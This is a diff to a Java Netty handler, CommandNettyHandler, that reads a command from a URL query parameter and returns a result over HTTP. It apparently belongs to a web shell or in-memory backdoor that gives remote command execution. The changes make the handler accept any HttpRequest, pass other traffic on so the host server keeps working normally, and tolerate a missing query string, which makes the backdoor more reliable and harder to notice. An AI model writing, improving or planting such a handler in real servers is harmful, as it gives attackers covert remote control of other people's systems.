@@ -22,8 +22,8 @@ public class CommandNettyHandler extends ChannelDuplexHandler {
     @Override
     @SuppressWarnings("all")
     public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
-        if (msg instanceof DefaultHttpRequest) {
-            DefaultHttpRequest request = (DefaultHttpRequest) msg;
+        if (msg instanceof HttpRequest) {
+            HttpRequest request = (HttpRequest) msg;
             HttpHeaders headers = request.headers();
             String uri = request.uri();
             String cmd = getParameter(uri, paramName);
@@ -44,12 +44,17 @@ public class CommandNettyHandler extends ChannelDuplexHandler {
             } catch (Exception ignored) {
             }
             send(ctx, result.toString());
+        } else {
+            ctx.fireChannelRead(msg);
         }
     }
 
     public String getParameter(String requestUrl, String paramName) throws Exception {
         URI uri = new URI(requestUrl);
         String query = uri.getQuery();
+        if (query == null) {
+            return null;
+        }
         String[] kvs = query.split("&");
         for (String kv : kvs) {
             String k = null;
